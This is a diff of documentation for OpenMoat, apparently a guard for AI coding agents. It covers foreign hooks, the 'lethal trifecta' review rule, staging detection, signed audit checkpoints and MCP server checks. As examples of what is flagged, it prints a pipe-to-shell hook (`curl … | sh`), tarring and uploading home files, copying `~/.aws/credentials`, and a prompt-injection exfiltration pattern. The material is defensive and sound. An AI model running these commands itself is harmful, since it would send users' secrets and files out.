@@ -5,7 +5,7 @@
 > [!NOTE]
 > **Read this when** an agent was stopped or held for review, you want to review what it did, change the policy or share rules with a team. Every command and exit code is here.
 
-**On this page:** [Where to use it](#where-to-use-it) · [What the default policy does](#what-the-default-policy-does) · [Run openmoat when something needs you](#run-openmoat-when-something-needs-you) · [How each agent is protected](#how-each-agent-is-protected) · [A call is denied](#a-call-is-denied) · [A call needs review](#a-call-needs-review) · [Session taint](#session-taint) · [Review what the agent did](#review-what-the-agent-did) · [Change the policy](#change-the-policy) · [Share rules with your team](#share-rules-with-your-team) · [If OpenMoat gets in your way](#if-openmoat-gets-in-your-way) · [Report a bug](#report-a-bug) · [Commands](#commands)
+**On this page:** [Where to use it](#where-to-use-it) · [What the default policy does](#what-the-default-policy-does) · [Run openmoat when something needs you](#run-openmoat-when-something-needs-you) · [How each agent is protected](#how-each-agent-is-protected) · [Other hooks the agents run](#other-hooks-the-agents-run) · [A call is denied](#a-call-is-denied) · [A call needs review](#a-call-needs-review) · [Session taint](#session-taint) · [The lethal trifecta](#private-data-untrusted-content-and-a-way-out-the-lethal-trifecta) · [Staging](#data-packed-or-copied-before-it-is-sent-staging) · [Review what the agent did](#review-what-the-agent-did) · [Check that the audit log was not changed](#check-that-the-audit-log-was-not-changed) · [Change the policy](#change-the-policy) · [Share rules with your team](#share-rules-with-your-team) · [If OpenMoat gets in your way](#if-openmoat-gets-in-your-way) · [Report a bug](#report-a-bug) · [Commands](#commands)
 
 ## Where to use it
 
@@ -195,7 +195,7 @@ exit code as the text:
 | Level | Means |
 |---|---|
 | `hook + OS sandbox` | the hook is installed and current, and the sandbox `openmoat init` generated is in place and matches the policy (Claude Code, Codex, Cursor) |
-| `hook only` | the hook is installed, but no OS sandbox from OpenMoat is in force: OpenClaw, GitHub Copilot CLI, pi, Gemini CLI, OpenCode, Hermes Agent, the Cline CLI, goose and the Antigravity CLI, which get none, Claude Code or Cursor on native Windows, or a sandbox that is missing, weakened or out of date (the line says which); `status` and `doctor` print the `openmoat run` command that gives such an agent an OS sandbox, or why there is none |
+| `hook only` | the hook is installed, but no OS sandbox from OpenMoat is in force: OpenClaw, GitHub Copilot CLI, pi, Gemini CLI, OpenCode, Hermes Agent, the Cline CLI, goose, the Antigravity CLI, Qwen Code and Crush, which get none, Claude Code or Cursor on native Windows, or a sandbox that is missing, weakened or out of date (the line says which); `status` and `doctor` print the `openmoat run` command that gives such an agent an OS sandbox, or why there is none |
 | `not protected` | the hook is missing, out of date or unreadable, or Hermes Agent's `shell-hooks-allowlist.json` does not approve it (run `openmoat init`), or its entry lacks the agent's fail-closed key (`fail_closed: true` for Hermes Agent, `failClosed: true` for Cursor: the agent would run a call whose hook failed; run `openmoat init`), or the agent ran without loading OpenMoat's plugin (below), or the agent's own settings file turns it off: `disableAllHooks` in Claude Code's or Copilot's `settings.json`, `[features] hooks = false` in Codex's `config.toml`, `hooksConfig` in Gemini CLI's, an `extensions` entry in pi's that excludes OpenMoat's extension, `-openmoat` (or `-*`) in OpenCode's `plugins` or a `policies` entry denying its plugin (the line names the file and the setting; remove it), or the agent's version does not load OpenMoat's hook (OpenCode before 1.3.4) |
 
 An agent not set up gets a `·` line; the agents not found share the `Not installed` line. `openmoat status --format
@@ -209,6 +209,105 @@ has every call denied (`protection-required`). `status` and `doctor` then add a 
 the agent, `required: hook + OS sandbox (your policy), met` or `…, not met, so every call
 is denied: <what is missing>; to meet it, <step>`, and the JSON a `required` object
 (`level`, `by`, `met`, `missing`, `fix`).
+
+A hook-only agent that `openmoat run` can confine on this machine, and that has no
+sandboxed-start shim, is listed under `Needs your attention` with the one command that
+confines it (`openmoat run -- qwen`, `openmoat run -- crush`, …); `openmoat init` names
+each such agent before it asks about sandboxed start.
+
+`openmoat doctor` also prints a protection score for each `openmoat run` tier this
+system can start, and for the hook alone, which scores 0: the kernel features the tier
+uses, weighted to 100, each missing one named with what brings it (ADR-108):
+
+```text
+protection  isolated    95/100; missing: landlock_udp (not on this system: needs Landlock ABI 10, Linux 7.2; …)
+protection  lightweight 80/100; missing: landlock_udp (…); isolated_view (…)
+protection  hook-only   0/100: no kernel feature is in force; …
+```
+
+`openmoat run --print-boundary -- <agent>` prints the score of the run it would start,
+and `sandbox.strict: true` in your own policy makes `openmoat run` start only with the
+whole score ([SANDBOX.md](SANDBOX.md#the-protection-score-and-strict-mode),
+[POLICY.md §9.7](POLICY.md#97-strict-mode-sandboxstrict)).
+
+### Can the agent's own sandbox start commands here? (Linux)
+
+`openmoat init` turns on the agents' own sandboxes (Claude Code, Codex, Cursor). On Linux
+each needs what its documentation lists ([SANDBOX.md](SANDBOX.md#what-each-agents-sandbox-needs-on-linux)):
+Claude Code needs `bwrap` and `socat` on `PATH`, and all three need to create user
+namespaces as you. Where they cannot, Claude Code's commands fail, Codex warns and its
+sandboxed commands do not start, and Cursor asks before each command. For each agent
+whose sandbox OpenMoat wrote, `openmoat doctor` reads `kernel.apparmor_restrict_unprivileged_userns`,
+`kernel.apparmor_restrict_unprivileged_unconfined`, `user.max_user_namespaces` and
+`kernel.unprivileged_userns_clone` from `/proc/sys`, which AppArmor profile applies to
+`/usr/bin/bwrap` (the kernel's list where you may read it, else the files in
+`/etc/apparmor.d/`), looks for the programs on `PATH`, and uses the probe `openmoat run`
+makes anyway (the system's `bwrap` asked to create its namespaces, as you). A `bwrap`
+that creates them settles the user-namespace question, but not for Claude Code under
+Ubuntu's `bwrap-userns-restrict` profile, which its sandbox fails under
+([SANDBOX.md](SANDBOX.md#what-each-agents-sandbox-needs-on-linux)). Each agent gets the
+fix its own documentation gives. Nothing needs root, no namespace is created for the
+check and nothing on the machine changes; no decision changes either.
+
+```console
+$ openmoat doctor
+! Claude Code      the agent's own sandbox cannot start commands on this machine: kernel.apparmor_restrict_unprivileged_userns is 1 (Ubuntu's AppArmor restriction on user namespaces), so its Bash commands fail (`failIfUnavailable`, no unsandboxed commands). To fix it: the AppArmor profile the agent's sandboxing documentation gives for /usr/bin/bwrap, in /etc/apparmor.d/bwrap (`profile bwrap /usr/bin/bwrap flags=(unconfined) { userns, }`, with its `abi` and `include` lines), then `sudo systemctl reload apparmor` and restart the agent; or `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`, which lifts the restriction for every program until the next reboot; the same line in a file under /etc/sysctl.d/ keeps it after a reboot. OpenMoat has no setting that leaves this agent's sandbox off; its hook still decides each call
+$ openmoat status
+! Claude Code      own sandbox cannot start commands here: user namespaces are blocked → openmoat doctor lists the fixes
+```
+
+The fixes are yours to run; OpenMoat never runs `sysctl` or `sudo`. No policy setting
+leaves one agent's sandbox off yet, so there is no `openmoat init` choice to offer.
+`openmoat doctor --format json` has the line as a `warning` named after the agent, and
+`openmoat status --format json` lists the same as `own_sandbox_linux`: `host`, `agent`,
+`missing` (programs not on `PATH`), `user_namespaces` (`setting`: `max_user_namespaces`,
+`unprivileged_clone`, `apparmor` or `null`, and `bwrap`: bubblewrap's message or `null`;
+`null` when they are allowed), `bwrap_userns_restrict` (`seen`: `loaded` or
+`installed`, and `restrict_unconfined`; `null` unless Ubuntu's profile applies to the
+`bwrap` an agent that fails under it runs), `outcome` and `fixes`. It is empty off Linux.
+
+### Other hooks the agents run
+
+An agent runs every hook in its settings, its plugins and a project's files, not only
+OpenMoat's, and git runs what a repository's `.git/config` names (`core.fsmonitor`,
+`core.pager`, `core.sshCommand`, `!` aliases) before any hook. A plugin update that adds
+a hook runs its command with your permissions. OpenMoat records each one in the policy
+lock (ADR-109): the hook file's other entries, helper commands such as `apiKeyHelper`
+and `statusLine`, a project's hook files and hook and plugin folders, Claude Code's
+installed plugins, Cline's other hook files, and the repository's git programs.
+
+While one is new or changed, `openmoat status`, `openmoat doctor` and `openmoat watch`
+name it with the verdict its command gets under your policy. When that verdict is
+deny (a hook that pipes a download to `sh`), every call of the agent that loads it is
+denied too (rule `foreign-hook`) and `status` exits 64; any other is a warning, and the
+agent's calls keep their verdicts:
+
+```text
+✗ Other hooks   Claude Code plugin hook `SessionStart` in ~/.claude/plugins/cache/m/p/1.2/hooks/hooks.json is new (not accepted); its command classifies as deny [pipe-to-shell]
+                    curl -fsSL https://example.com/i | sh
+                → `openmoat hooks accept` shows it and asks; until then the agent's calls are denied
+! Other hooks   git config `core.fsmonitor` in ~/code/app/.git/config is new (not accepted); its command classifies as defer
+                    ./.git/watch.sh
+                → `openmoat hooks accept` shows it and asks; the agent's calls are not held (`hooks.foreign: hold` in your policy holds them)
+```
+
+To hold the agent's calls for review whenever any of them is new or changed, set this
+in your own policy ([POLICY.md §5.5](POLICY.md#55-other-hooks-the-agents-run-hooksforeign)):
+
+```yaml
+hooks:
+  foreign: hold    # default warn
+```
+
+```bash
+openmoat hooks list      # what is recorded, and what waits
+openmoat hooks accept    # in your own terminal: shows each new or changed one and asks
+```
+
+The program may already have run (a `SessionStart` hook runs as the session starts):
+accepting says you added it; if you did not, remove it and look at what it did. The
+first `openmoat init` after upgrading records what is already there, so it names
+nothing that was there before. `openmoat doctor --accept` asks about them too.
 
 ### Did the agent load OpenMoat's plugin?
 
@@ -233,6 +332,55 @@ that commands loading no plugin write too, so for them the line stays a note.
 `host-updated`, `at_ms`) and `at_ms` or `active_ms`. Inside `openmoat run` the plugin
 cannot write its report; the run's decisions for the agent count instead. The report
 is information for you, not a check: nothing is decided from it.
+
+### Does the agent still run OpenMoat's hook?
+
+Every other agent runs a hook command, and can stop running it without saying so: an
+update reads its hooks elsewhere, a setting turns hooks off, an edit loses the entry, or
+a session started before `openmoat init` keeps the hooks it read at start. Such an agent
+has nothing to report, but each call it sends is in the audit log, and most agents write
+a file for each session they run. So `openmoat status` and `openmoat doctor` compare the
+newest call the guard recorded for the agent with the last change that could have
+stopped the hook (OpenMoat writing it, the hook file or a settings file that turns hooks
+off changing, or the agent's program on the search path changing) and with the agent's
+session files written since (ADR-104):
+
+| Line | Shown by | Means |
+|---|---|---|
+| `· hook runs: last call <time>` | `doctor` | a call reached OpenMoat after the last change |
+| `· no call since OpenMoat wrote its hook (<time>); <agent> has not run a session since, as far as OpenMoat can tell` (or `since its settings changed`, `since <agent> was updated`) | `doctor` | nothing to check yet: start the agent |
+| `· no call since …; OpenMoat cannot tell whether <agent> ran since (<why>)` | `doctor` | an agent whose session files OpenMoat does not know (goose, Hermes Agent, Antigravity CLI, Crush) |
+| `! <agent> ran 3 sessions since … (last <time>), and OpenMoat saw no call from it: if they used tools, the hook did not run and the calls were not checked` | `status`, `doctor`, `watch` | sessions at least ten minutes old were written since the change, and no call came |
+| `! a Claude Code session started <time> and called Bash (last written <time>), but no call of it reached OpenMoat: its tool-call hook did not run, so those calls were not checked` | `status`, `doctor`, `watch` | Claude Code only, at once: the session's start reached OpenMoat, its own transcript names a tool OpenMoat's hook covers, and no call arrived within 30 s of the transcript's last write (ADR-109); a resumed session waits for the line above |
+
+The warning's fix: restart the agent (a session from before the change may not run the
+new hook); if the line stays, run `openmoat init` and check what turns the agent's hook
+off (the "Turned off" column in [LIMITS.md](LIMITS.md#if-the-hook-fails)), and for Codex
+trust OpenMoat's hooks in `/hooks`. It is a warning, never a lower protection level, and
+nothing is decided from it: a session that used no tool, or ran on another machine that
+shares the directory, looks the same. `openmoat watch` looks every thirty seconds and
+prints one line when an agent's plugin or hook turns missing and one when its calls come
+back. `openmoat status --format json` lists every set-up hook agent under `hooks`, in
+the form of `plugins` (`change` is also `hook-written` or `settings-changed`; `missing`
+adds `sessions`).
+
+| Agent | Session files OpenMoat looks at, in its configuration directory | Source |
+|---|---|---|
+| Claude Code | `projects/*/*.jsonl` | [Claude Code: application data](https://code.claude.com/docs/en/claude-directory#application-data) |
+| Codex | `sessions/<year>/<month>/<day>/*.jsonl`; `config.toml` changing counts as a change | [Codex source: `precompute_new_rollout_path`](https://github.com/openai/codex/blob/main/codex-rs/rollout/src/recorder.rs) |
+| Cursor | `chats/*/*/store.db` (the Cursor CLI; the editor's chats are not seen) | not in Cursor's documentation: Cursor staff on its forum ([chats folder](https://forum.cursor.com/t/cursor-agent-create-chat-and-how-to-delete-old-chats/156640), [`store.db`](https://forum.cursor.com/t/local-ide-agent-chats-and-the-agent-cli-still-use-separate-session-stores/165486)) |
+| GitHub Copilot CLI | `session-state/*/events.jsonl` | [Copilot CLI configuration directory](https://docs.github.com/en/copilot/reference/copilot-cli-reference/cli-config-dir-reference) |
+| Gemini CLI | `tmp/*/chats/*.jsonl`, and `*.json` from earlier releases | [Gemini CLI session management](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/session-management.md), [`chatRecordingService.ts`](https://github.com/google-gemini/gemini-cli/blob/main/packages/core/src/services/chatRecordingService.ts) |
+| Qwen Code | `projects/*/chats/*.jsonl` (`QWEN_RUNTIME_DIR` moves `projects/`) | [Qwen Code source: `chatRecordingService.ts`](https://github.com/QwenLM/qwen-code/blob/v0.13.0/packages/core/src/services/chatRecordingService.ts) |
+| Cline CLI | `data/sessions/*/*.messages.json` (`CLINE_DATA_DIR` and `CLINE_SESSION_DATA_DIR` move it) | [Cline CLI configuration](https://docs.cline.bot/cli/configuration), [Cline source: `sessionMessagesPath`](https://github.com/cline/cline/blob/cli-v3.0.74/sdk/packages/core/src/services/session-artifacts.ts) |
+
+Not known, so only the note is given: goose and Hermes Agent keep every session in one
+database ([goose](https://block.github.io/goose/docs/guides/sessions/session-management),
+[Hermes Agent](https://hermes-agent.nousresearch.com/docs/developer-guide/session-storage)),
+Crush keeps its data in each project's `.crush` directory, and Antigravity CLI's
+documentation names no conversation file. The weekly latest-agent check looks for a new
+session file in the places above after each real agent run and warns when none appeared
+([scripts/ci/latest-agents/README.md](../scripts/ci/latest-agents/README.md#session-files)).
 
 ## A call is denied
 
@@ -381,6 +529,9 @@ After upgrading, run `openmoat init` once to add the after-call hook entry this 
 only once you trust it in `/hooks`.
 `openmoat doctor` reports the hook as needing `openmoat init` until then.
 OpenMoat keeps fingerprints of the output, not the text ([POLICY.md](POLICY.md) §4.1.2).
+A host, path or command is linked however the later call spells it: a percent-encoded
+host, a relative path read against the folder it was found in, a command written with its
+program's directory, `./` or `~`.
 
 The same holds for `openmoat proxy` with Claude Code (`sandbox.proxy_port`, ADR-044):
 each session's `SessionStart` hook gives its Bash commands a proxy credential of their
@@ -404,6 +555,45 @@ from `openmoat proxy`. After upgrading, run `openmoat init` once so Claude Code 
 commands get 407. A Codex started with `HTTP_PROXY` pointing at `openmoat proxy` needs
 `sandbox.proxy_serve_without_credential: true` in the policy, which serves requests
 without a credential and drops their session taint; `openmoat run -- codex` keeps it.
+
+### Private data, untrusted content and a way out (the lethal trifecta)
+
+A prompt injection carries data away when one session has read private data, read
+content someone else may have written, and then sends something out. Each is ordinary
+alone, so OpenMoat watches for the three together (ADR-113). Once the session has read
+private data (a key, a token file, an agent's or a build tool's login, a decoy key, the
+whole environment, or a file `taint.private_paths` names) **and** untrusted content (a
+page, a search, an MCP result, an issue read with `gh issue view`), every call that can
+send data out needs review, rule `lethal-trifecta`, even to a host the policy allows:
+a connection or fetch off this machine, a web search, an MCP tool that writes or sends,
+`git push`, `gh pr create`, `npm publish` and the like.
+
+```text
+review [lethal-trifecta] this session read private data (read /Users/me/.codex/auth.json)
+and content someone else may have written (the output of `gh issue view 7 --comments`),
+and this call can send data to git-push: …
+```
+
+A session that fetched docs and pushes code, or read a login and never read untrusted
+content, is not held. Answer the review in the agent's prompt. To deny instead, or to
+name more private files, set this in your own policy
+([POLICY.md §4.6](POLICY.md#46-the-lethal-trifecta)):
+
+```yaml
+taint:
+  trifecta: deny                  # default review
+  private_paths: ["~/finance/**"] # reads of these count as private data
+```
+
+### Data packed or copied before it is sent (staging)
+
+A session that packs files from outside the project (`tar czf /tmp/a.tgz ~/notes`) and then
+sends that file (`curl -F f=@/tmp/a.tgz https://…`), or that copied private data into a
+file (`cp ~/.aws/credentials notes/`) and then sends anything (`git push`), needs review,
+rule `staging-egress` ([POLICY.md §4.5](POLICY.md#45-staging-data-sent-after-collection)).
+A send after many reads outside the project, with nothing packed, is only recorded; `openmoat
+report` counts those per session. A policy from an earlier release gets the rule with
+`openmoat policy upgrade`.
 
 ## Review what the agent did
 
@@ -473,6 +663,13 @@ OpenMoat 0.17.0 · watching Claude Code, Codex · policy 16 deny · 10 allow · 
   verdict column; the mark still shows it. The width is read from `COLUMNS`.
 - It only reads the audit log, a short read twice a second that never waits on the hook
   nor makes it wait. Ctrl-C exits 0.
+- At the start and every thirty seconds it also checks whether each agent still runs
+  OpenMoat ([plugin](#did-the-agent-load-openmoats-plugin),
+  [hook](#does-the-agent-still-run-openmoats-hook)), and prints one red line when an
+  agent turns missing ("✗ Claude Code: Claude Code ran 2 sessions since …, and OpenMoat
+  saw no call from it: … Run `openmoat doctor` for the fix") and one when its calls reach
+  OpenMoat again ("✔ Claude Code: OpenMoat sees its calls again"); nothing
+  while that stays the same. `--host` limits it to that agent.
 
 ### Why was this blocked?
 
@@ -548,6 +745,8 @@ The link works until this stops (Ctrl-C). Anyone holding it can read what `openm
 - Run it yourself, in a terminal: like `openmoat allow`, it refuses when an agent started
   it, and the default policy denies it to agents ([ADR-066](adr/ADR-066-openmoat-serve.md)).
 
+### Check that the audit log was not changed
+
 Credentials are redacted before anything is stored. The log is a SQLite file in
 `~/.moat`; nothing leaves your machine unless you run `openmoat audit export` or turn on
 live delivery ([DELIVERY.md](DELIVERY.md)).
@@ -573,6 +772,38 @@ Event ids print in hexadecimal, the form `openmoat show` and `openmoat why` take
 `10442` is the log's 66626th. An anchor protects only as well as the place you keep it: push the ref
 (`git -C ~/notes push origin refs/moat/anchors`) or copy the file somewhere else.
 `openmoat doctor` shows when you last anchored.
+
+An anchor can be checked only on this machine. A signed checkpoint can be checked by
+anyone you give its public key, without the audit key: it states how many events the log
+held and a Merkle root over them, signed with a key of its own, `~/.moat/audit.key.ed25519`
+([ADR-110](adr/ADR-110-signed-audit-checkpoints.md)). `openmoat audit anchor` writes one
+beside each anchor, the guard writes one every 1000 events, and you can sign one now:
+
+```bash
+openmoat audit checkpoint                    # signs one; prints it, its file and the public key
+openmoat doctor                              # shows the public key and checks the newest checkpoint
+openmoat audit export > audit.jsonl          # the whole log, no filter
+# on any machine, with the public key `doctor` shows:
+openmoat audit verify audit.jsonl --checkpoint ~/.moat/checkpoints/000000001000-3f2a9c1e.txt \
+  --pubkey 'openmoat.dev/audit/3f2a…+…+…'
+```
+
+It fails when an event the checkpoint covers was edited, deleted or rewritten, or the log
+was cut below it; events after the checkpoint are covered by the chain only. The checkpoint
+is in the format transparency logs use (C2SP `tlog-checkpoint` in a `signed-note`), so it
+can be kept where others can see it: give the file and public key to a reviewer, commit
+it with your anchors, or have a [transparency-dev witness](https://github.com/transparency-dev/witness)
+cosign it, which needs a consistency proof from the size it saw last. Nothing is sent
+anywhere by OpenMoat. Like the audit key, the signing key is a file that code running as
+you outside any sandbox can read; a checkpoint already copied elsewhere still shows a
+later rewrite. `openmoat audit checkpoint --new-key` starts a new key and keeps the old
+one: each checkpoint verifies with the public key of the key that signed it.
+
+When an agent's call is held for review, its row records the exact text the agent's
+prompt showed you (`shown:` in `openmoat show`). Where the agent reports a call after it
+ran (Claude Code), a `ran-after-review` row beside it says whether what ran is the action
+you were shown (`review-ran-as-shown`) or something else (`review-ran-changed`, with what
+ran).
 
 When a reviewer asks how you control what the agent does, `openmoat audit evidence --since 30d`
 lists, per framework control, the rules that fired and sample events from the log. It is
@@ -672,6 +903,45 @@ openmoat                         # shows what changed and asks to accept it (ter
 
 `openmoat doctor --accept` does the same without the question.
 
+To see whether an edit lets any call through that the old policy stopped, compare the two
+files ([POLICY.md §8.3](POLICY.md#83-does-a-change-widen-openmoat-policy-diff---widen-adr-111)):
+
+```bash
+cp ~/.moat/policy.yaml ~/policy.before.yaml       # before you edit
+openmoat policy diff ~/policy.before.yaml ~/.moat/policy.yaml --widen
+openmoat policy diff old.yaml new.yaml --widen --fixtures tests/conformance/attacks.yaml
+openmoat policy diff old.yaml new.yaml --widen --format json   # for a script
+```
+
+It lists each call that moves toward allow (deny > review > defer > allow) with the rules
+before and after, and says which kinds of call it proved over every path, host and name
+and which it checked over cases only. It exits 0 when nothing widens, 2 when something
+does and 3 when only a setting changed whose direction it does not rank.
+
+A `deny` or `review` rule can also look at what a call's arguments hold, with `when:`
+([POLICY.md §2.4](POLICY.md#24-argument-conditions-when)): mail to a recipient outside
+your domain, a browser tool opening a site outside a list, a save outside the project, a
+URL that came from content the agent read:
+
+```yaml
+deny:
+  - id: mail-outside-team
+    mcp: ["mcp__mail__send_email"]
+    when:
+      - { arg: [to, cc, bcc], not_in: ["*@example.com"] }
+review:
+  - id: planted-url
+    mcp: ["mcp__http__post"]
+    when:
+      - { arg: url, provenance: untrusted }
+```
+
+The tests are `under`/`not_under` (paths), `host_in`/`host_not_in` (URLs), `in`/`not_in`
+(values, recipient lists), `matches`/`not_matches` (whole values) and `provenance:
+untrusted`. A negated test also holds when the call names no such value, so a tool that
+calls the field something else is still stopped; name every key it uses. `openmoat policy
+lint` refuses `when:` on `allow` and `defer` rules.
+
 Until you re-pin, every call is denied with `kernel-integrity`: a pinned file that
 changed without a person accepting it is treated as tampered. The same happens when
 anything else edits the policy, a hook file or another pinned file:
@@ -757,7 +1027,15 @@ openmoat policy upgrade --dry-run   # what the new default adds, grouped; change
 openmoat policy upgrade --diff      # the same, then the full diff of the policy
 openmoat policy upgrade             # shows the changes, asks, keeps a backup, re-pins and syncs the sandboxes
 openmoat policy upgrade --undo      # put the previous policy back
+openmoat policy upgrade --accept-widening   # apply an upgrade that moves calls toward allow
 ```
+
+Under the summary, the upgrade says whether it moves any call toward allow, checked over the
+bundled calls, cases from both policies' rules and a search over every path, host and name
+(docs/POLICY.md §8.3). An upgrade that widens is listed case by case and applied only with
+`--accept-widening`; without it nothing changes and the command exits 3. What else the
+release after 0.25.0 changes for you (hooks to rewrite with `openmoat init`, the new
+reviews): [INSTALL.md](INSTALL.md#from-0250-to-0260).
 
 The changes are grouped by what they do, read from the policy before and after:
 
@@ -831,6 +1109,8 @@ pack changed after you installed it stops every call until you look (`openmoat d
 If your policy says `require_signed_repo_policy: true`, a repository policy is trusted
 only when a trusted key signed it (`.moat/policy.yaml.sig`): a signed one needs no
 `openmoat trust`, and an unsigned one only tightens, even after `openmoat trust`.
+Before it asks, `openmoat trust` lists each call that trusting the file would move toward
+allow, and `openmoat policy install` does the same for a pack (ADR-111).
 
 To check pull requests before they are merged, whoever or whatever wrote them, run
 `openmoat policy check-diff` in CI. It reports every changed file the policy protects
@@ -840,7 +1120,8 @@ files as the base branch has them. Its content checks read each added line, offl
 near-miss and off-registry dependencies, install scripts, lockfile hashes swapped for the
 same version, GitHub workflows a fork can take over, downloaded or decoded code that
 runs, private keys, and hosts your network allow list does not name; `check_diff.levels`
-in the policy sets each rule to `deny`, `review` or `off`. The repository's `action.yml`
+in the policy sets each rule to `deny`, `review` or `off`. With `--base`, a change that
+makes `.moat/policy.yaml` decide any call less strictly fails with `diff-widens`. The repository's `action.yml`
 runs it on GitHub ([MERGE_CHECK.md](MERGE_CHECK.md)).
 
 ## MCP servers through the gateway
@@ -961,6 +1242,38 @@ $ openmoat audit export --session 9f2c…
 
   Calls of the same server, tools that only read, and other sessions stay quiet. To trust
   a server's flows, list it in the policy: `mcp: { flow_trusted: [github] }`.
+- **Both protocol revisions are checked.** An agent that speaks MCP 2026-07-28 has no
+  `initialize` handshake; the gateway pins the server's `server/discover` answer instead
+  (its instructions, capabilities and versions; the cache hints `ttlMs` and `cacheScope`
+  are not pinned) and the server information each result names. A server whose results
+  name another server than the one you accepted is held: all its calls are refused until
+  `openmoat mcp accept` (a new version number alone holds nothing). A server you accepted
+  under the older revision keeps its acceptance while its text stays the same
+  ([ADR-114](adr/ADR-114-mcp-2026-07-28-and-package-provenance.md)).
+- **What a server asks of you is checked, in any revision.** A sampling request (the
+  server asks the model to write text) is refused, as a request or inside a 2026-07-28
+  result's `inputRequests`; allow it with `mcp: { allow_sampling: true }`. A URL
+  elicitation (the server asks the agent to open a page for you) passes only for an
+  `https` page on a host that is not this machine, a private network or a link-local
+  address such as the cloud metadata service `169.254.169.254`, and that the policy does
+  not deny. The default policy denies connections to hosts it does not list, so a server
+  that sends you to its own sign-in page needs that host allowed: `openmoat allow --site
+  auth.example.com`. A refused request refuses the whole answer, with error -32001.
+- **Where an argument goes is part of the tool.** A 2026-07-28 tool can send an argument
+  as an HTTP header (`x-mcp-header`); `openmoat mcp accept` names each such mapping, and a
+  changed one holds the tool. A tool whose mappings break the specification's rules, or
+  whose schema's `$ref`s point outside it, loop or nest too deep, is left out and its calls
+  refused.
+- **A new package release is held like a changed definition.** When you accept a server
+  started with `npx`, `uvx` or `docker run`, OpenMoat records the release it runs, read
+  from the command line and the package manager's own files on this machine (no network):
+
+  ```text
+  MCP server `mail` in ~/.claude.json changed
+      package release: npm package postmark-mcp 1.0.15 (sha512-…) → npm package postmark-mcp 1.0.16 (sha512-…)
+  ```
+
+  Its tool calls are refused, and a wrapped one does not start, until you accept it again.
 
 The gateway covers stdio servers. A remote (HTTP) server is checked by the hook alone, and
 its results are not kept for the flow check. Tool results reach the model as the server
@@ -975,11 +1288,30 @@ these takes one command in your own terminal (agents are denied all of them):
 - **Every call is denied** with rule `kernel-integrity`: a pinned file (the policy, a hook, an
   agent's settings) changed behind OpenMoat's back. Run `openmoat`; it shows the change and
   asks whether to accept it (`openmoat doctor --accept` does the same).
+- **A call is denied** with rule `canary`: it read, changed or sent one of the decoy keys
+  you had `openmoat init` plant ([INSTALL.md](INSTALL.md#two-choices-init-offers-decoy-keys-and-sandboxed-start)).
+  No real work does, so this is not OpenMoat in your way: something in that session went
+  looking for keys, often an instruction in a page, a file or a tool result the agent read.
+  `openmoat why --last` shows the call and `openmoat watch` the session; `openmoat status`
+  keeps flagging it for a week. Nothing real was exposed. To stop planting decoys,
+  `openmoat uninstall` deletes them.
+- **Typing an agent's name says `openmoat run` confines the agent to a project**: you
+  chose sandboxed start at `openmoat init`, and the shell is in your home folder. Start the
+  agent in a project, or run the program the shim in `~/.moat/bin` names to start it
+  without the sandbox there. `openmoat uninstall --hosts <agent>` removes its shim.
 - **An MCP server's tools are denied** with rule `mcp-server-changed`: its definition (in
   `~/.claude.json`, a project's `.mcp.json`, Cursor's `mcp.json`, Codex's `config.toml`;
   every agent's files are in [POLICY.md](POLICY.md) §8) changed or was added since you
   last accepted the agents' MCP servers, so it starts a command nobody reviewed. Run `openmoat mcp accept <server>`: it shows what changed and asks.
-  Other servers and tools keep working meanwhile.
+  Other servers and tools keep working meanwhile. A server started with `npx`, `uvx` or
+  `docker run` is held the same way when the package release it runs is not the one you
+  accepted (`package release: … → …`); the same command clears it.
+- **A wrapped MCP server's sign-in link or sampling request is refused** (error -32001,
+  rule `mcp-server-request`): a link the server asks you to open must be `https` to a host
+  the policy allows, and the default policy denies connections to hosts it does not list.
+  To let a server send you to its own page, allow that host: `openmoat allow --site
+  auth.example.com`. Sampling stays off unless the policy sets
+  `mcp: { allow_sampling: true }` ([POLICY.md §8](POLICY.md#8-the-policy-lock)).
 - **A wrapped MCP server shows no tools**, or its calls fail with error -32602 naming
   `openmoat mcp accept`: `openmoat mcp proxy` holds every tool of a server until you have read
   it, the first time the server starts through the proxy too. Run `openmoat mcp accept
@@ -1112,19 +1444,21 @@ reads `~`. The file must not exist yet, and an agent cannot run it.
 |---|---|
 | `openmoat` | see which agents are protected and today's decisions; answer drift, a policy update or the last review (terminal only) |
 | `openmoat demo [--format json]` | see what your policy (or the default one) decides for a fixed list of example agent calls; nothing runs, no hook or file is touched |
-| `openmoat init [--hosts …] [--yes] [--dry-run] [--verbose] [--mcp-proxy [--mcp-no-sandbox] \| --no-mcp-proxy]` | install policy, lock and audit log, and pin the agents' MCP server definitions; asks before hooking each agent found (`--hosts`, `--yes` skip the questions), but not about an agent whose files already have everything; at a terminal also offers to run the stdio MCP servers through OpenMoat, showing the change first ([ADR-076](adr/ADR-076-hook-only-os-sandbox-and-mcp-startup.md)); `--no-mcp-proxy` opts out; `--verbose` also prints each file written with its hook entries, the backups and the files the lock pins. Over an existing lock without a person at a terminal, new and changed MCP servers are listed and left for `openmoat mcp accept`, the recorded binary, agent directories and search path are kept, and drift is refused |
+| `openmoat init [--hosts …] [--yes] [--dry-run] [--hooks-only] [--format text\|json] [--verbose] [--mcp-proxy [--mcp-no-sandbox] \| --no-mcp-proxy]` | install policy, lock and audit log, and pin the agents' MCP server definitions; asks before hooking each agent found (`--hosts`, `--yes` skip the questions), but not about an agent whose files already have everything; at a terminal also offers to run the stdio MCP servers through OpenMoat, showing the change first ([ADR-076](adr/ADR-076-hook-only-os-sandbox-and-mcp-startup.md)); `--no-mcp-proxy` opts out; `--verbose` also prints each file written with its hook entries, the backups and the files the lock pins. Over an existing lock without a person at a terminal, new and changed MCP servers are listed and left for `openmoat mcp accept`, the recorded binary, agent directories and search path are kept, and drift is refused. `--hooks-only` and `--format json`: [below](#init-for-scripts-hooks-only-and-json) |
 | `openmoat uninstall [--hosts …] [--purge]` | remove OpenMoat's hooks and sandbox settings, restoring the backups (`--purge` also deletes `~/.moat`) |
-| `openmoat status [--format json]` · `openmoat doctor [--accept] [--verbose]` | check the installation and each agent's protection level · list drift and re-pin (`--verbose` lists every check with its paths, each agent's known gaps and where each sandbox is stricter or wider than the policy) |
